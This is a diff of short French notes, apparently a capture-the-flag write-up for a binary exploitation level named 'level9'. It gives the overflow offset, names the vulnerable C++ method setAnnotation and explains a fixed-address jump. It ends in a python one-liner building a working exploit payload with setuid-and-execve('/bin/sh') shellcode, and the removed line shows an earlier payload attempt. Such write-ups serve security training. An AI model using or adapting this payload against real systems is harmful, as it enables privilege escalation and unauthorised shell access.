@@ -1,1 +1,9 @@
-python -c "print '\x11\xff\xff\xbf' + 'A' * 104 + '\x0c\xa0\x04\x08'" > /tmp/level9
+on trouve l'offset a 108
+
+on overwrite grace a memset dans la methode _ZN1N13setAnnotationEPc
+on met l'addresse de la ou on peut ecrire en memoire '\x0c\xa0\x04\x08'
+et avant notre shellcode on met l'adresse du debut de notre shellcode pour jump dessus
+
+on peut ne pas export de shellcode car l'adresse ou o n ecrit est fixe
+
+python -c "print '\x10\xa0\x04\x08' + '\x31\xc0\x89\xc3\xb0\x17\xcd\x80\x31\xd2\x52\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x52\x53\x89\xe1\x8d\x42\x0b\xcd\x80' + 'A' * 72 + '\x0c\xa0\x04\x08'" > /tmp/level9
